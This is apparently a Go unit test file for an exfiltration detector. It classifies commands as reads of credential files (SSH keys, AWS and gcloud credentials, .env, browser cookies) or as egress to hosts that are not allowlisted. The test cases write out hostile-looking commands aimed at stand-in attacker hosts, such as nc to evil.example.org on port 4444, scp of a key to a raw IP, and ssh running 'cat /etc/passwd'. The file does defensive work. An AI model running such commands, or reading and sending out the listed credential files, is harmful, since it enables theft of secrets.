// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestClassify_ReadLegs(t *testing.T) {
	v := newVocabulary(nil, nil)
	cases := []struct {
		name string
		args []string
		cat  string
	}{
		{"cat", []string{"~/.ssh/id_ed25519"}, "ssh-key-store"},
		{"head", []string{"~/.aws/credentials"}, "aws-credentials"},
		{"cat", []string{"~/.config/gcloud/creds.json"}, "gcloud-credentials"},
		{"cat", []string{"~/.kube/config"}, "kube-config"},
		{"cat", []string{"~/.netrc"}, "netrc"},
		{"cat", []string{"~/.docker/config.json"}, "docker-config"},
		{"cat", []string{"~/.git-credentials"}, "git-credentials"},
		{"tar", []string{"cf", "-", "~/.gnupg/secring.gpg"}, "gpg-keyring"},
		{"cp", []string{"./privkey.pem", "/tmp/x"}, "pem-private-key"}, // *.pem only when the name says private
		{"cp", []string{"./client.key", "/tmp/x"}, "pem-private-key"},  // *.key is always a private key
		{"cat", []string{"./.env"}, "dotenv"},
		{"cat", []string{"./.env.production"}, "dotenv"},
		{"cat", []string{"./key4.db"}, "browser-key-db"},
		{"cat", []string{"./cookies.sqlite"}, "browser-cookies"},
	}
	for _, c := range cases {
		kind, cat := v.classify(c.name, c.args)
		assert.Equal(t, legRead, kind, "%s %v", c.name, c.args)
		assert.Equal(t, c.cat, cat, "%s %v", c.name, c.args)
	}
}

func TestClassify_ExcludedReadersAndNonSensitive(t *testing.T) {
	v := newVocabulary(nil, nil)
	// ssh/git/ssh-keygen/ssh-add are NOT in the read vocabulary.
	for _, name := range []string{"git", "ssh-keygen", "ssh-add"} {
		kind, _ := v.classify(name, []string{"~/.ssh/id_ed25519"})
		assert.Equal(t, legNone, kind, "%s must not be a read leg", name)
	}
	// A repo file literally named ssh/ssh_config must NOT match (substring guard).
	kind, _ := v.classify("cat", []string{"./ssh_config"})
	assert.Equal(t, legNone, kind)
	kind, _ = v.classify("cat", []string{"./ssh"})
	assert.Equal(t, legNone, kind)
	// A public key must NOT match.
	kind, _ = v.classify("cat", []string{"~/.ssh/id_ed25519.pub"})
	assert.Equal(t, legRead, kind, "a file under ~/.ssh/ still counts by dir prefix")
	// But a .pub outside ~/.ssh (basename glob path) must not match id_*.
	kind, _ = v.classify("cat", []string{"./id_ed25519.pub"})
	assert.Equal(t, legNone, kind, "a .pub public key outside the store must not match")
	// PUBLIC cert material — a bare *.pem with no private-key hint — must NOT
	// match (precision: routine mTLS/custom-CA use is not exfil).
	for _, pub := range []string{"./ca.pem", "./fullchain.pem", "./cert.pem", "./chain.pem", "./server.pem"} {
		k, _ := v.classify("cat", []string{pub})
		assert.Equal(t, legNone, k, "%s is public cert material, not a private key", pub)
	}
}

func TestClassify_EgressLegsAndAllowlist(t *testing.T) {
	v := newVocabulary(nil, nil)
	// Non-allowlisted egress → egress leg.
	fires := [][2]interface{}{}
	_ = fires
	nonAllow := []struct {
		name string
		args []string
	}{
		{"curl", []string{"https://evil.example.net/x"}},
		{"wget", []string{"https://drop.evil.example/x"}},
		{"nc", []string{"evil.example.org", "4444"}},
		{"scp", []string{"/tmp/k", "root@203.0.113.7:/tmp/"}},
		{"ssh", []string{"evil.example.com", "cat", "/etc/passwd"}},
		{"openssl", []string{"s_client", "-connect", "evil.example.com:9001"}},
		{"socat", []string{"-", "TCP:evil.example.com:9001"}},
	}
	for _, c := range nonAllow {
		kind, _ := v.classify(c.name, c.args)
		assert.Equal(t, legEgress, kind, "%s %v should be an egress leg", c.name, c.args)
	}

	// Allowlisted egress → legNone.
	allow := []struct {
		name string
		args []string
	}{
		{"curl", []string{"https://proxy.golang.org/x"}},
		{"curl", []string{"https://registry.npmjs.org/react"}},
		{"curl", []string{"https://sub.npmjs.org/x"}},
		{"curl", []string{"https://pypi.org/simple/"}},
		{"curl", []string{"http://127.0.0.1:2586/rig"}},
		{"curl", []string{"http://localhost:8080/health"}},
		{"scp", []string{"/tmp/x", "buildhost.abc.ts.net:/tmp/"}},
		{"curl", []string{"https://goproxy.cn/x"}},
		{"scp", []string{"/tmp/x", "user@100.101.102.103:/tmp/"}},
		{"ssh", []string{"github.com", "info"}},
	}
	for _, c := range allow {
		kind, _ := v.classify(c.name, c.args)
		assert.Equal(t, legNone, kind, "%s %v should be allowlisted (legNone)", c.name, c.args)
	}
}

func TestClassify_SSHInteractiveIsNotEgress(t *testing.T) {
	v := newVocabulary(nil, nil)
	// A bare interactive ssh (no remote command) is NOT egress.
	kind, _ := v.classify("ssh", []string{"evil.example.com"})
	assert.Equal(t, legNone, kind)
	// With -p flag + host but no command: still not egress.
	kind, _ = v.classify("ssh", []string{"-p", "2222", "evil.example.com"})
	assert.Equal(t, legNone, kind)
	// With a remote command: egress.
	kind, _ = v.classify("ssh", []string{"-p", "2222", "evil.example.com", "id"})
	assert.Equal(t, legEgress, kind)
}

func TestClassify_UnparseableEgressIsBenign(t *testing.T) {
	v := newVocabulary(nil, nil)
	// curl with no scheme URL and no host → not an egress leg (precision).
	kind, _ := v.classify("curl", []string{"--help"})
	assert.Equal(t, legNone, kind)
	kind, _ = v.classify("nc", []string{"-l", "4444"})
	assert.Equal(t, legNone, kind, "a listener is not egress")
}

func TestExtraAllowlistAndPaths(t *testing.T) {
	v := newVocabulary([]string{"vault-secret.txt"}, []string{"*.corp.example", "10.20.0.0/16", "myhost.example"})
	// Extra sensitive basename.
	kind, _ := v.classify("cat", []string{"./vault-secret.txt"})
	assert.Equal(t, legRead, kind)
	// Extra allowlist suffix / exact / CIDR.
	assert.True(t, v.isAllowlisted("api.corp.example"))
	assert.True(t, v.isAllowlisted("myhost.example"))
	assert.True(t, v.isAllowlisted("10.20.30.40"))
	assert.False(t, v.isAllowlisted("evil.example.net"))
}

func TestHostFromAuthority(t *testing.T) {
	assert.Equal(t, "evil.example.com", hostFromAuthority("user@evil.example.com"))
	assert.Equal(t, "evil.example.com", hostFromAuthority("evil.example.com:22"))
	assert.Equal(t, "host", hostFromAuthority("host"))
	assert.Equal(t, "", hostFromAuthority("./local/path"))
}
